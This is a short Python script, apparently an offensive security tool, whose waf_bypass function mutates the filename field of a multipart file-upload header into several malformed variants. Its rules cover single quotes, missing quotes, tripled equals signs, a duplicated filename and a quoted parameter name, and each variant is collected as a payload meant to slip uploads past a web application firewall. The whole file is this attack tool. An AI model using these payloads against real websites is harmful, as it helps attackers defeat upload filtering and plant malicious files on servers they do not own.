import re

waf_rule_list = [
    ['filename===',r'filename=',r"filename==="],
    ['单引号filename',r'filename="(.*)"',r"filename='\g<1>'"],
    ['无包裹filename',r'filename="(.*)"',r'filename=\g<1>'],
    ['双name',r'filename=',r'filename="1.jpg";filename='],
    ['单引号name',r'filename=',r"'filename'="],
    ['双引号name',r'filename=',r'"filename"=']
]
payload_list = []
def waf_bypass(paste):
    for rule in waf_rule_list:
        payload = re.sub(rule[1],rule[2],paste,1)
        payload_list.append([rule[0],payload])
    return payload_list
